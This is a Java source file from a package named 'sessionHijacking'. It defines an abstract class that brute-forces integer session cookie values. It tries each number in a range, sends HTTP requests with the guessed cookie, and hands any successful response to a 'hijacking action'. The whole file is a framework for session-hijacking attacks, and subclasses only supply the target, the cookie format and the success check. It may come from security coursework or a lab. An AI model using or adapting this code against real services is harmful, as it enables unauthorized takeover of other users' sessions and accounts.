package sessionHijacking;

import responseReader.HttpURLConnectionResponseReader;

import java.net.HttpURLConnection;
import java.util.function.Consumer;
import java.util.function.Function;

public abstract class IntegerCookieValueGuesser {

    private final int guessFrom;
    private final int guessTo;
    private final Function<Integer, String> integerTransformer;
    private final HttpURLConnectionResponseReader responseReader;
    private final Consumer<String> hijackingAction;

    public IntegerCookieValueGuesser(int guessFrom, int guessTo) {
        this.guessFrom = guessFrom;
        this.guessTo = guessTo;
        this.integerTransformer = getIntegerTransformer();
        this.responseReader = getResponseReader();
        this.hijackingAction = getHijackingAction();
    }

    public void doSessionHijacking() throws Throwable{
        String cookieTemplate = getCookieTemplate();
        for(int i = guessFrom; i <= guessTo; i++){
            String cookie = String.format(cookieTemplate, integerTransformer.apply(i));
            HttpURLConnection httpURLConnection = getHttpURLConnection(cookie);
            String response = responseReader.read(httpURLConnection);
            if(isGuessSuccessful(response)){
                hijackingAction.accept(response);
                return;
            }
            httpURLConnection.disconnect();
        }
        throw new IllegalStateException("Invalid range");
    }

    protected abstract boolean isGuessSuccessful(String response);

    protected abstract String getCookieTemplate();

    protected abstract HttpURLConnection getHttpURLConnection(String cookie) throws Exception;

    protected abstract HttpURLConnectionResponseReader getResponseReader();

    protected abstract Function<Integer, String> getIntegerTransformer();

    protected abstract Consumer<String> getHijackingAction();
}
